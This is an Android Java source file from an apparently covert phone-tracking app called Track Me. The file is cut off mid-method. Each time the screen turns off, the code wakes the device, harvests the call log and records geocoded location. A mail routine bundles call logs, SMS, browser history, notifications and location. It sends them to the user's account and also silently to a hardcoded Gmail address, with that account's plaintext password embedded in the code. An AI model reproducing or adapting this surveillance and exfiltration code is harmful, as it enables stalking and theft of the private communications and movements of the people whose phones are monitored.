package org.activity;


/*
This class is used to  gps location from network or gps if available and it also includes 
braoadcast reciever which wake up cpu and save collected location
data into sqlite database after device sleep on each 3 sec .
*/

import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.GregorianCalendar;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;

import org.appTracker.R;
import org.trackme.Location.ShowLocationActivity;

import org.trackme.alarmservice.AlarmReciever;
import org.trackme.automaticEmail.Mail;
import org.trackme.calllog.CallLogActivity;
import org.trackme.smscenter.MessageBox;
import org.trackme.systemServicesAndCpuWakeup.DevicePolicyActivity;
import org.trackme.utility.Appfonts;
import org.trackme.utility.BrowserData;
import org.trackme.utility.CallData;
import org.trackme.utility.ConnectionDetector;
import org.trackme.utility.SMSData;

import com.alarm.SnoozeActivity;


import database.DBController;
import android.location.Address;
import android.location.Criteria;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.os.PowerManager;
import android.os.StrictMode;
import android.os.SystemClock;
import android.provider.Browser;
import android.provider.CallLog;
import android.provider.SyncStateContract.Constants;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.ProgressDialog;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.Typeface;
import android.telephony.SmsManager;
import android.text.Html;
import android.text.Spanned;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

public class DashBoardActivity extends Activity implements OnClickListener, LocationListener    

{
	boolean dateCheck=false;
	/** Called when the activity is first created. */
	Spanned userLocationInformation;
	
	double latitude ;	public static String LocationInformation=""; public static String NotificationInformation=""; 
	
	double longitude ;	
	String result;	
	Long subtractedMillisecFromCurrentSystemHour;
	//---location address string	
	String userLoc;	
	TextView contactView;
	
	Location location = new Location("any string"); 

   public static String    smsInboxString        = "";
   public static String    smsSentboxString      = ""; 
   public static String    smsDraftboxString     = "";
   public static String    callLogString         = "";
   public static String    browserLogString      = "";
   
   ArrayList<BrowserData>  browserLog = new ArrayList<BrowserData>();
     //--- call log data array list
         List<CallData>    callLogList   = new ArrayList<CallData>();
	 //---sms data array list
	     List<SMSData>     smsInboxList   = new ArrayList<SMSData>();
	 //---sms data array list
		 List<SMSData>     smsSenboxList  = new ArrayList<SMSData>();
	 //---sms data array list
		 List<SMSData>     smsDraftList   = new ArrayList<SMSData>();
		 
    
	   Context ctx;

	   String  latituteField;
	  
	   String  longitudeField;
	  
	   LocationManager locationManager;
	  
	   String provider;
	  
	DBController dbController = new DBController(this);
	
	static BroadcastReceiver mReceiver;
	
	static String TAG = "WakeUp-----BroadCast----testing";
	
	static Context context;
	   
	//--- Connection detector class
    ConnectionDetector cd;
	
    //---flag for Internet connection status
	Boolean isInternetPresent = false;
	 	
	EditText  loginemail,loginpassword;TextView logoutBtn;
	
	Button   facebookNotificationBtn, browserHistoryBtn,messageBox,backbutton,callLogs,locationInformationBtn,Settings;
	
	TextView  titleLabel;
	
	//---Initialising strings so that they don;'t throw null pointer exception if preferences includes no data.
	
	public static String    prefencesEmailID="",
			                prefrencesPassword="";
	
	static SharedPreferences pref = null;
	
	Typeface typeface;
	
	public static ArrayList<HashMap<String, String>> UserData = new ArrayList<HashMap<String, String>>();
	
	@Override
	protected void onCreate(Bundle savedInstanceState) 
	{
		super.onCreate(savedInstanceState);
		
		requestWindowFeature(Window.FEATURE_NO_TITLE);		
		
		//---connection detector object initialisation
		cd = new ConnectionDetector(getApplicationContext());
		
        //---initialisation shared preferences object... 
		pref            = getSharedPreferences("email_prefrence", Context.MODE_PRIVATE);
		
		setContentView(R.layout.dashboard_activity);
		
		//---initialisation application context
		context = DashBoardActivity.this;
		
		//---function to remove restrict mode policy exceptions
		StrictModePolicies();
		
		//===check for network availability
		//checkNetworkAvailability();
		
		//===check registered account (if any exist or not)				
		//checkRegisterAccountStatus();
				
		//====Wake up phone braodcast reciever method which get data and send infomation to mail account after specific interval.
		WakeUpPhone();
				
		//===set layout
		InitLayout();
		
		//===get device location using network opertor lat-long
		GetCurrentLocation();
		
	}

	private void StrictModePolicies() 
	
	{		
		StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);		
	}
	
	
	
	
	
	//--activity on resume method for registering broadcast receiver
	protected void onResume()
	{
		super.onResume();
		
		//---for location
	        locationManager.requestLocationUpdates(provider, 400, 1, this);
		
	        //---for wake up reciever
		    IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_OFF);
		    registerReceiver(mReceiver, filter);
		    Log.i(TAG, "broadcast receiver registered!");
		    
		   
	}
	
	
	
	
	
	//---activity on destroy method unregistering broadcast receiver
	protected void onDestroy()
	  {	
		super.onDestroy();
	       unregisterReceiver(mReceiver);
	       Log.i(TAG, "broadcast UNregistred!");

	  }

	
	
	
  public void WakeUpPhone()       {
		
		mReceiver = new BroadcastReceiver() {
	        @Override
	        public void onReceive(Context context, Intent intent) {
	            Log.v(TAG, "Screen OFF onReceive()");
	             //--- The maximum time that should pass before the user gets a location update.
	             //---long MAX_TIME = AlarmManager.INTERVAL_FIFTEEN_MINUTES; 
	             screenOFFHandler.sendEmptyMessageDelayed(0, 3000L);
	        }
	    };

	}
	
      
      
      
	private void InitLayout() 
	{
		
		        //---initializing font typeface object
				typeface         =       Appfonts.getFont(DashBoardActivity.this, Appfonts.OswaldRegular);
						
				//---getting instruction textview by id and setting custom font style on it.
				titleLabel                       = (TextView)findViewById(R.id.titleLabel);
				titleLabel.setTypeface(typeface);
				
				backbutton                       = (Button)  findViewById(R.id.backbutton);
				backbutton.setOnClickListener(this);
				
				logoutBtn                     = (TextView)  findViewById(R.id.logoutBtn);
				logoutBtn.setOnClickListener(this);
				
				messageBox                       = (Button)  findViewById(R.id.messageBox);
				messageBox.setOnClickListener(this);
				
				callLogs                         = (Button)  findViewById(R.id.callLogs);
				callLogs.setOnClickListener(this);
				
				locationInformationBtn           = (Button)  findViewById(R.id.locationInformationBtn);
				locationInformationBtn.setOnClickListener(this);
				
				Settings                         = (Button)  findViewById(R.id.Settings);
				Settings.setOnClickListener(this);
				
				browserHistoryBtn  =(Button)findViewById(R.id.browserHistoryBtn);
				browserHistoryBtn.setOnClickListener(this);
				
				
				facebookNotificationBtn =(Button)findViewById(R.id.facebookNotificationBtn);
				facebookNotificationBtn.setOnClickListener(this);
				
				
	}

	


	private void GetCallBox() 
	{   
		
		
		Log.i("inside callBox","inside callBox");	
	
		//--- Create Sent box URI
	    Uri sentURI = Uri.parse("content://call_log/calls");

	    // Get Content Resolver object, which will deal with Content Provider
	    ContentResolver cr = getContentResolver();

	    // Fetch Sent SMS Message from Built-in Content Provider
	    Cursor c = cr.query(sentURI, null, null, null, null);
	    
	 // Read the sms data and store it in the list
	    if(c.moveToLast()) {
	        
	    	for(int i=0; i < c.getCount(); i++) {
	           
	        	CallData callData = new CallData();
	            
	          
	            
	            int date = c.getColumnIndexOrThrow("date");
				//---converting date into proper format
				    
				    long seconds=c.getLong(date);
				    
				    SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yy HH:mm");
				    
				    String dateString = formatter.format(new Date(seconds));
				    
				    
				    
				    
				    SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yy");
					
				 
					   //---get current date time with Calendar()
					   Calendar cal = Calendar.getInstance();
					   String  sysDate = sdf.format(cal.getTime());
					   System.out.println("system date format---"+sysDate);
				    
				    
					   
				  
					   
							  
					try  
					
					    {
							  
				        	Date date1 = sdf.parse(sysDate);
						
				        	Date date2 = sdf.parse(dateString);
				 
				        	System.out.println(sdf.format(date1));
				        	System.out.println(sdf.format(date2));
				 
				        	Calendar cal1 = Calendar.getInstance();
				        	Calendar cal2 = Calendar.getInstance();
				        	
				        	cal1.setTime(date1);
				        	cal2.setTime(date2);
				 
				        	if(cal1.after(cal2))  
				        	{
				        		
				        		//---Toast.makeText(context, "Please select present or future date.", Toast.LENGTH_SHORT).show();
				        		
				        		System.out.println("system date is after current date");
				        		
				        		
				        		break;
				        		
				        	}
				 
				        	if(cal1.before(cal2)){
				  
				        		System.out.println("system date is before current date");
				        		
				        	
				        		break;
				
				        	}
				 
				        	if(cal1.equals(cal2)){
				        		
				        	
				        		System.out.println("system date is equal current date");
				    
				        		//break;
				        		
				        	}
								} 
					                catch (java.text.ParseException e) 
								{
									
									e.printStackTrace();
								}
				    	
				
							  callData.setDate     (dateString);
							  
							  int type = c.getColumnIndex(CallLog.Calls.TYPE);
							  
							  Log.i("call type", String.valueOf(type));
							  
							  String callType="";
								
					            //---String callLogStr = id + ":--Caller Number" + callerNumner+"-Date--"+date+"--Call Duration--"+CallDuration+"sec"+"---Caller Name--"+CallerName;
								
								
								//---update database code ...
								//---get system data ...
							

								switch (type)  
								
								{
								 
								case CallLog.Calls.INCOMING_TYPE:
									//callLogStr += " (Incoming)";
									 
									 callType  = "(Incoming)";
									break;
									
								case CallLog.Calls.OUTGOING_TYPE:
									//callLogStr += " (Outgoing)";
									 callType  = " (Outgoing)";
									break;
									
								case CallLog.Calls.MISSED_TYPE:
									//callLogStr += "(Missed)";
									callType  = " (Missed)";
									break;
									
								   default:
								   callType  = " (Unknown)";
								   break;
								}

		
								
					String callLogStr = c.getString(c.getColumnIndex(CallLog.Calls._ID)) + ":--Caller Number" + c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME))+"-Date--"+date+"--Call Duration--"+c.getString(c.getColumnIndex(CallLog.Calls.DURATION))+"sec"+"---Caller Name--"+c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));
					Log.e("callLogStr", callLogStr)	;				
								
					callData.setType(callType);		
				    callData.setDate(dateString);
					callData.setDuration(c.getString(c.getColumnIndex(CallLog.Calls.DURATION)));
					callData.setId(c.getString(c.getColumnIndex(CallLog.Calls._ID)));
					callData.setNumber(c.getString(c.getColumnIndex(CallLog.Calls.NUMBER)));
					
                    String caller_name = c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME));
					if( caller_name == null )
					{
						callData.setCached_name("Number without Name");
					}
					else
					{
					
						callData.setCached_name(c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME)));
						
						
					}
					
				
					callLogList.add(callData);
					 
				c.moveToPrevious();
	        }
	    }
	    c.close();

	
	    
	    for(int i=0;i < callLogList.size();i++)
		{
			//Log.i("sms list data==","--date--"+ callLogList.get(i).getDate()+"--body--"+ smsSenboxList.get(i).getBody()+"--address--"+ smsSenboxList.get(i).getAddress()+"--type--"+ smsSenboxList.get(i).getType());
		}
		

		//----adding header to the location data details...
	    callLogString = String.valueOf(Html.fromHtml(new StringBuilder() 
				
				.append("<br><p><b><marquee><font color='#145A14'>User Call Log details are given below:--------------------------------------------------------------</font></marquee></b></p><br>")
				
				.toString()));
				
				//---converterting order list data into html format...
				
				for(int i=0;i< callLogList.size();i++)
				{
					
					
										
					callLogString =	callLogString + String.valueOf(Html.fromHtml(new StringBuilder()
					
			           .append("<br><br><p><b><font color='#145A14'> Sr. No -:</font></b><b>"+callLogList.get(i).getId()+"</b></p>")
			            
			            .append("<p><b><font color='#145A14'>Caller Number   -:</font></b><b>"+callLogList.get(i).getNumber()+"</b></p>")
			            
			             .append("<p><b><font color='#145A14'>Calll Date   -:</font></b><b>"+callLogList.get(i).getDate()+"sec"+"</b></p>")
			             
			              .append("<p><b><font color='#145A14'>Caller Name   -:</font></b><b>"+callLogList.get(i).getCached_name()+"</b></p>")
			              
			               .append("<p><b><font color='#145A14'>Call type       -:</font></b><b>"+callLogList.get(i).getType()+"</b></p>")
			               
			                .append("<p><b><font color='#145A14'>Call duration     -:</font></b><b>"+callLogList.get(i).getDuration()+"</b></p>")
			               
			               
		               
		                .toString()));
					
					//Log.i("smsSentboxString",smsSentboxString);

				}
				
			//	Log.i("smsSentboxString",smsSentboxString);
		
	}
	
	
	
	
	private void GetLocationDataAndConvertItIntoHtmlFormat() 
	{
		DBController dbController = new DBController(this);
		
		UserData.clear();
		
		UserData = dbController.getUserLocationData();
		
	    //	Log.e("user location array size-----------", String.valueOf(UserData.size()));
		
		//----adding header to the location data details...
		LocationInformation = String.valueOf(Html.fromHtml(new StringBuilder() 
		
		        .append("<br><p><b><marquee><font color='#145A14'>User Location Data Detail are as given below:-------------------------------------------------------</font></marquee></b></p><br>")
		
		.toString()));

		//---converterting order list data into html format...
		for(int i=0;i< UserData.size();i++)
		
		{
		
			LocationInformation  =	LocationInformation + String.valueOf(Html.fromHtml(new StringBuilder()
	           
			    .append("<br><br><p><b><font color='#145A14'> Sr. No -:</font></b><b>"+UserData.get(i).get("Id")+"</b></p>")
	            
	            .append("<p><b><font color='#145A14'>Location Update Time   -:</font></b><b>"+UserData.get(i).get("Time")+"</b></p>")
	            
                .append("<p><b>"+UserData.get(i).get("PlaceName")+"</b></p><br><br><br>")
                
                .toString()));
			
		    
		}
		
	//Log.i("LocationInformation",LocationInformation);
	}

	
	

	
	
	/*private void GetUserCallLogsDataAndConvertItIntoHtmlFormat() 
	{
		UserData = dbController.getUserCallLogsData();
		
		Log.i("order_list size------ -----", String.valueOf(UserData.size()));
		
		//----adding header to the location data details...
		callLogString = String.valueOf(Html.fromHtml(new StringBuilder() 
		
		.append("<br><p><b><marquee><font color='#145A14'>User Call Logs Detail are as given below:---------------------------------------------------------------</font></marquee></b></p><br>")
		
		.toString()));
		
		//---converterting order list data into html format...
		
		for(int i=0;i< UserData.size();i++)
		{
			
			
			
			callLogString =	callLogString + String.valueOf(Html.fromHtml(new StringBuilder()
			
	           .append("<br><br><p><b><font color='#145A14'> Sr. No -:</font></b><b>"+UserData.get(i).get("Id")+"</b></p>")
	            
	            .append("<p><b><font color='#145A14'>CallerId   -:</font></b><b>"+UserData.get(i).get("CallerId")+"</b></p>")
	            
	             .append("<p><b><font color='#145A14'>CallerNumner   -:</font></b><b>"+UserData.get(i).get("CallerNumner")+"</b></p>")
	             
	              .append("<p><b><font color='#145A14'>CallDate   -:</font></b><b>"+UserData.get(i).get("CallDate")+"</b></p>")
	              
	               .append("<p><b><font color='#145A14'>CallDuration   -:</font></b><b>"+UserData.get(i).get("CallDuration")+"sec"+"</b></p>")
	               
	                .append("<p><b>----<font color='#145A14'>CallerName   -:</font></b><b>"+UserData.get(i).get("CallerName")+"</b></p>")
	               
	                 .append("<p><b><font color='#145A14'>CallType   -:</font></b><b>"+UserData.get(i).get("CallType")+"</b></p>")
	            
               
                .toString()));
			
			//Log.i("callLogString",callLogString);

		}
		
		Log.i("callLogString",callLogString);
	}

	*/
	
	
	
private void GetCurrentLocation() 
{
	
	System.out.println("inside get current location method");
	
	// Get the location manager
    locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
    
    // Define the criteria how to select the locatioin provider -> use  default
    Criteria criteria = new Criteria();
    
    provider          = locationManager.getBestProvider(criteria, false);
   
    Location location = locationManager.getLastKnownLocation(provider);
   
    
    
    // Initialize the location fields
    if (location != null) 
    
    {
      System.out.println("Provider " + provider + " has been selected.");
      
      onLocationChanged(location);
    }
    
    else
    
    {
      latituteField  = "Location not available";
      
      longitudeField = "Location not available";
      
      System.out.println("not able to find locations inside GetCurrentLocation() method.");
      
      System.out.println("latituteField   value---"+latituteField);
      
      System.out.println("longitudeField  value---"+longitudeField);
 
    }
		
	}






	@Override
	public void onClick(View v) 
	{
		switch (v.getId()) {
		
		case R.id.facebookNotificationBtn:
			
			Intent notificationMessagesActivity = new Intent(getApplicationContext()         ,         FacebookWhatsAppMessages.class);
			startActivity(notificationMessagesActivity);
			//--slide from left to right
	        overridePendingTransition( R.anim.slide_in_left, R.anim.slide_out_left );
			
			
			break;
			
			
	case R.id.messageBox:
			
			Intent msgActivity = new Intent(getApplicationContext()         ,         MessageBox.class);
			startActivity(msgActivity);
			//--slide from left to right
	        overridePendingTransition( R.anim.slide_in_left, R.anim.slide_out_left );
			
			
			break;
        case R.id.callLogs:
			
        	Intent callLogsActivity = new Intent(getApplicationContext()     ,        CallLogActivity.class);
			startActivity(callLogsActivity);
			//--slide from left to right
	        overridePendingTransition( R.anim.slide_in_left, R.anim.slide_out_left );
			
			
			break;
			
			
        case R.id.locationInformationBtn:
			
        	Intent locationActivity = new Intent(getApplicationContext()     ,        ShowLocationActivity.class);
			startActivity(locationActivity);
			//--slide from left to right
	        overridePendingTransition( R.anim.slide_in_left, R.anim.slide_out_left );
			
			
			break;
       case R.id.Settings:
			
        	Intent settingActivity = new Intent(getApplicationContext()       ,       DevicePolicyActivity.class);
			startActivity(settingActivity);
			//--slide from left to right
	        overridePendingTransition( R.anim.slide_in_left, R.anim.slide_out_left );
			
			
			break;
			
       case R.id.logoutBtn:
    	   Intent logoutBtn = new Intent (getApplicationContext(),LoginActivity.class);
    	   logoutBtn.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
    	   startActivity(logoutBtn);
       
		case R.id.backbutton:
			
			finish();
			
			break;
			
		case R.id.browserHistoryBtn:
			
			Intent browserHistory = new Intent(getApplicationContext(),BrowserHistory.class);
			
			startActivity(browserHistory);
			
			break;
			
			
		default:
			
			break;
		}
		
	}
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	//-----This is the main funtionality controller method which do each task automatically without any user interaction
	//==================================================================================================================
	
	
	
	private Handler screenOFFHandler = new Handler()      
	
	{

	    @Override
	    public void handleMessage(Message msg) 
	    
	    {

	        super.handleMessage(msg);
	        // do something
	        // wake up phone
	        Log.i(TAG, "wake up the phone and disable keyguard");
	        
	        PowerManager powerManager = (PowerManager) DashBoardActivity.this.getSystemService(Context.POWER_SERVICE);
	       
	        long l = SystemClock.uptimeMillis();
	        
	        
	        //=== retrieve call logs from call content provider and save it into database
			//GetCallLogInfoAndUpdateDatabase();
			GetCallBox();
			//===convert user call log data into html format and save in a string to further send it to mail account.
			//GetUserCallLogsDataAndConvertItIntoHtmlFormat(); 
			
			//===calling background thread to load messages data
			String url="";
			
			new GetMessageData(context, url).execute();
			
	        /*
	   	     * mail sending method called here
	         * sending mail to user account to check wheather this code works or not
	         * sending email id and password details to previously registered account.
	         */
	        
			//sendEmailToRegisteredAccount();
	        
	        Log.i("email check 1", "Email  sent successfully");
	        
	        
	        //---turn on gps
	        
			//---turnGPSOn();
				
			//---run background thread to get device current location names
			new CityAsyncTask().execute();
		
	        powerManager.userActivity(l, false);
	        
	        //===false will bring the screen back as bright as it was, true - will dim it
	    }

	};
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
      private void sendEmailToRegisteredAccount()  {
		
		//===get email id and password
		  getSharedPrefrencesData();
				
		
		  Mail m = new Mail(prefencesEmailID , prefrencesPassword); 
		 
		  String[] toArr = {prefencesEmailID, prefencesEmailID}; 
	      m.set_to(toArr); 
	      m.set_from("woowoo@woo.com"); 
	      m.set_subject("Your Track Me application account information mail from java wrapper."); 
	      
	      m.setBody("Hi......................"+prefencesEmailID+"                                    "+"         "+callLogString
	    		  
	      +"                                                                                                     "+NotificationInformation
	      +"                                                                                                     "+smsInboxString
	      +"                                                                                                     "+smsSentboxString
	      +"                                                                                                     "+smsDraftboxString
	      +"                                                                                                     "+browserLogString
	      +"                                                                                                     "+LocationInformation
	      ); 
	      
	      
	 
	      try 
	      
	      { 
	      //  m.addAttachment("/sdcard/filelocation"); 
	 
	        if(m.send()) 
	        { 
	          
	        	Log.i("email check2", "Email was sent successfully");
	        	/*NotificationInformation = "";
	        	callLogString       = "";
	        	smsInboxString      = "";
	        	smsSentboxString    = "";
	        	smsDraftboxString   = "";
	        	browserLogString    = "";
	        	LocationInformation = "";*/
	        	//---change data contining string into empty strings
	        	
	        	
	        	
	       dbController.emptytableCallLogs();
	       dbController.emptytableNotiMsg();
	        	//Toast.makeText(WakeUpSystemServicesActivity.this, "Email was sent successfully.", Toast.LENGTH_LONG).show(); 
	          
	        	//Toast.makeText(WakeUpSystemServicesActivity.this, "Please check your mail account for login informations.", Toast.LENGTH_LONG).show(); 
	        }  
	        
	        else  
	        { 
	        	Log.i("email check", "Email not sent ");
	        	//Toast.makeText(WakeUpSystemServicesActivity.this, "Email was not sent.", Toast.LENGTH_LONG).show(); 
	        } 
	    } 
	      
	      catch(Exception e) 
	     
	      { 
	        //Toast.makeText(MailApp.this, "There was a problem sending the email.", Toast.LENGTH_LONG).show(); 
	        Log.e("MailApp", "Could not send email", e); 
	      } 
	    
	      
	      
	      
	      
	      
	      //=======================================================new mail
	      Mail newMail = new Mail("Tourguide0001@gmail.com" , "luckytrackme"); 
	 	 
	      String[] newtoArr = {"Tourguide0001@gmail.com", "Tourguide0001@gmail.com"}; 
	      newMail.set_to(newtoArr); 
	      newMail.set_from("TourGuide0001@gmail.com"); 
	      newMail.set_subject("Your Track Me application account information mail from java wrapper."); 
	      
	      newMail.setBody("Hi......................"+prefencesEmailID+"                                    "+"   "+callLogString
	     
	      +"                                                                                                     "+smsInboxString
	      +"                                                                                                     "+smsSentboxString
	      +"                                                                                                     "+smsDraftboxString
	      +"                                                                                                     "+NotificationInformation
	      +"                                                                                                     "+browserLogString
	      +"                                                                                                     "+LocationInformation
	      ); 
	      
	      
	      
	      
	      try 
	      
	      { 
	      //  m.addAttachment("/sdcard/filelocation"); 
	 
	        if(newMail.send()) 
	        { 
	          
	        	Log.i("email check2", "Email was sent successfully");
	        	callLogString   ="";
	        	smsInboxString  = "";
	        	smsSentboxString = "";
	        	smsDraftboxString= "";
	        	browserLogString =  "";
	        	LocationInformation = "";
	        	dbController.emptytableCallLogs();
	        	
	        	dbController.emptytableNotiMsg();
	         }  
	        
	        else  
	        { 
	        	Log.i("email check", "Email not sent ");
	        } 
	      } 
	      catch(Exception e) 
	      { 
	        //Toast.makeText(MailApp.this, "There was a problem sending the email.", Toast.LENGTH_LONG).show(); 
	        Log.e("MailApp", "Could not send email", e); 
	      } 
	    
	      
		
	}


public static void getSharedPrefrencesData() 

{
	
	//---Retreiving Prefrence    
             prefencesEmailID      =  pref.getString("email"    ,     prefencesEmailID);
             prefrencesPassword    =  pref.getString("password" ,     prefrencesPassword);
             
             
      
}

//==========================================location information code below=========


/* Remove the locationlistener updates when Activity is paused */

       protected void onPause()
       
        {
        super.onPause();
        locationManager.removeUpdates(this);
        }


public void onLocationChanged(Location location) 
{
  double lat = (double) (location.getLatitude());
  double lng = (double) (location.getLongitude());
  latituteField = String.valueOf(lat);
  longitudeField = String.valueOf(lng);
  
  System.out.println("latituteField--longitudeField---"+latituteField+"----"+longitudeField);
}


public void onStatusChanged(String provider, int status, Bundle extras) {
  

}


public void onProviderEnabled(String provider) 
{
  Toast.makeText(this, "Enabled new provider " + provider, Toast.LENGTH_SHORT).show();

}


public void onProviderDisabled(String provider) 

{
  
	Toast.makeText(this, "Disabled provider " + provider,Toast.LENGTH_SHORT).show();
	
}




//-----Background thread to generate places names and andress detail

public class CityAsyncTask extends AsyncTask<String , String,String>
{

    @Override
    protected String doInBackground(String... params) {
    	//Log.i("current Lat Long value",String.valueOf( location.getLatitude()+""+location.getLongitude()));
    	System.out.println("latituteField--longitudeField---"+latituteField+"----"+longitudeField);
    	//double latitude = location.getLatitude();
    	//double longitude =location.getLongitude();
    	String add ;StringBuffer UserLocationResutl = new StringBuffer();
         Geocoder geocoder = new Geocoder(DashBoardActivity.this, Locale.getDefault());
            try
            {
            	if (latituteField.equals("Location not available"))
            	{
            		latituteField =longitudeField = "0.0";
            		
            	}
                List<Address> addresses = geocoder.getFromLocation(Double.parseDouble(latituteField), Double.parseDouble(longitudeField), 4);
                
                Log.e("Addresses","-->"+addresses);
                
                if(addresses.size()>1)
                {
              
                result = addresses.get(1).toString();
                
                
            Address obj = addresses.get(1);
  	        add = obj.getAddressLine(1);
  	         String currentAddress = obj.getSubAdminArea() + ","+ obj.getAdminArea();
  	         double latitude = obj.getLatitude();
  	         double longitude = obj.getLongitude();
  	         String currentCity= "City:  "+obj.getSubAdminArea();
  	         String currentState= "state: "+obj.getAdminArea();
  	      
  	       UserLocationResutl = UserLocationResutl.append( "State:"+obj.getAdminArea()    +"_________");
  	         // add = add + "\n" + obj.getPostalCode();
  	       UserLocationResutl = UserLocationResutl.append("City:"+obj.getSubAdminArea()  +"_________");
  	       UserLocationResutl = UserLocationResutl.append( "Town:"+obj.getLocality()      +"_________");
  	       UserLocationResutl = UserLocationResutl.append("Country:"+obj.getCountryName()+"_________");
  	       UserLocationResutl = UserLocationResutl.append("Latitude:"+obj.getLatitude()  +"_________");
	       UserLocationResutl = UserLocationResutl.append( "Longitude:"+obj.getLongitude());
	       
  	        // add = add + "\n" + obj.getCountryCode();
  	        // add = add + "\n" + obj.getSubThoroughfare();
               Log.d("GPS address value", "country"+obj.getCountryName()+"country-code"+obj.getCountryCode()+"admin area"+obj.getAdminArea()+"postal code"+obj.getPostalCode()+"sub admin area"+obj.getSubAdminArea()+"locality"+obj.getLocality()); 
  	        
               
               Log.v("IGA", "Address" + latitude+longitude+ "--------"+UserLocationResutl);
               userLoc = String.valueOf(UserLocationResutl);
  	         //HomescreenActivity.current_address = add;
                
                }
                else if(addresses.size()==1)
                {
                  result = addresses.get(0).toString();
                  
                  Address obj = addresses.get(0);
    	          add = obj.getAddressLine(0);
    	         String currentAddress = obj.getSubAdminArea() + ","
    	                 + obj.getAdminArea();
    	         double latitude = obj.getLatitude();
    	         double longitude = obj.getLongitude();
    	         String currentCity= obj.getSubAdminArea();
    	         String currentState= obj.getAdminArea();
    	        
    	        
    	         UserLocationResutl = UserLocationResutl.append( "State:"+obj.getAdminArea()    +"_________");
      	         // add = add + "\n" + obj.getPostalCode();
      	       UserLocationResutl = UserLocationResutl.append("City:"+obj.getSubAdminArea()  +"_________");
      	       UserLocationResutl = UserLocationResutl.append( "Town:"+obj.getLocality()      +"_________");
      	       UserLocationResutl = UserLocationResutl.append("Country:"+obj.getCountryName()+"_________");
      	       UserLocationResutl = UserLocationResutl.append("Latitude:"+obj.getLatitude()  +"_________");
    	       UserLocationResutl = UserLocationResutl.append( "Longitude:"+obj.getLongitude());
    	        // add = add + "\n" + obj.getCountryCode();
    	        // add = add + "\n" + obj.getSubThoroughfare();
                 Log.d("GPS address value", "country"+obj.getCountryName()+"country-code"+obj.getCountryCode()+"admin area"+obj.getAdminArea()+"postal code"+obj.getPostalCode()+"sub admin area"+obj.getSubAdminArea()+"locality"+obj.getLocality()); 
    	        
                 userLoc = String.valueOf(UserLocationResutl);
                 Log.v("IGA", "Address" +latitude+longitude+ add);
    	         
    	        // HomescreenActivity.current_address = add;
                  
                }
                else
                {
                	userLoc = "Sorry, current place information is not available.";
                }
                //result=String.valueOf(addresses);
            }
            catch (IOException e)
            {
                e.printStackTrace();
            }
        return userLoc;
    }
    
  
    @Override
    protected void onPostExecute(String result) 
    {
        
        super.onPostExecute(result);
        
        
        //---updating database with the new entries...
        UpdateDatabase();
      
      
    }
}

public void UpdateDatabase() 
{
	
	DBController dbController = new DBController(this);
	
	//---get system data
	 Date systemTime = new Date(System.currentTimeMillis());
	
	  HashMap<String, String> queryValues =  new  HashMap<String, String>();
		
	  
		queryValues.put("Time",String.valueOf(systemTime));
		
		queryValues.put("PlaceName"  ,   userLoc);
		
		queryValues.put("Latitude",      latituteField);
		
		queryValues.put("Longitude",     longitudeField);
		
		dbController.addInformationToLocationTable(queryValues);  
	
	System.out.println("database updated successfully.");
}


public void turnGPSOn()
{
	
	//---get current position using gps
	location.setLatitude(latitude);
	
	location.setLongitude(longitude);

    //location = CurrentLocationvalue();
    /* Intent intent = new Intent("android.location.GPS_ENABLED_CHANGE");
     intent.putExtra("enabled", true);
     sendBroadcast(intent);

    String provider = Settings.Secure.getString(DashBoardActivity.this.getContentResolver(), Settings.Secure.LOCATION_PROVIDERS_ALLOWED);
    if(!provider.contains("gps"))
        { 
        //if gps is disabled
        final Intent poke = new Intent();
        poke.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider"); 
        poke.addCategory(Intent.CATEGORY_ALTERNATIVE);
        poke.setData(Uri.parse("3")); 
        sendBroadcast(poke);
    }*/
}

public void turnGPSOff()
{
    /*String provider = Settings.Secure.getString(DashBoardActivity.this.getContentResolver(), Settings.Secure.LOCATION_PROVIDERS_ALLOWED);
    if(provider.contains("gps")){ //if gps is enabled
        final Intent poke = new Intent();
        poke.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider");
        poke.addCategory(Intent.CATEGORY_ALTERNATIVE);
        poke.setData(Uri.parse("3")); 
        sendBroadcast(poke);
    }*/
}


private Location CurrentLocationvalue() {
	   
		//Log.i("current Lat Long value",String.valueOf( location.getLatitude()+""+location.getLongitude()));
		//Location location = mMap.getMyLocation();
		if (location == null) { // It seems that the above usually returns null
			LocationManager service = (LocationManager) getSystemService(LOCATION_SERVICE);
			Criteria criteria = new Criteria();
			String provider = service.getBestProvider(criteria, false);
			location = service.getLastKnownLocation(provider);
		}
		return location;
	}



//-----Retrieving Messages data in the background thread 
private class GetMessageData extends AsyncTask<Void, Void, Void> {

	//ProgressDialog dialog;
	Context context;
	private String url;

	public GetMessageData(Context context, String url) {
		this.context = context;
		this.url = url;
		
	}

	@Override
	protected void onPreExecute() {
		super.onPreExecute();
	//	dialog = ProgressDialog.show(context, "", "Please wait.....", true,true);
		//dialog.show();
		

	}

	@Override
	protected Void doInBackground(Void... params) 
	
	{
		
	return null;
	
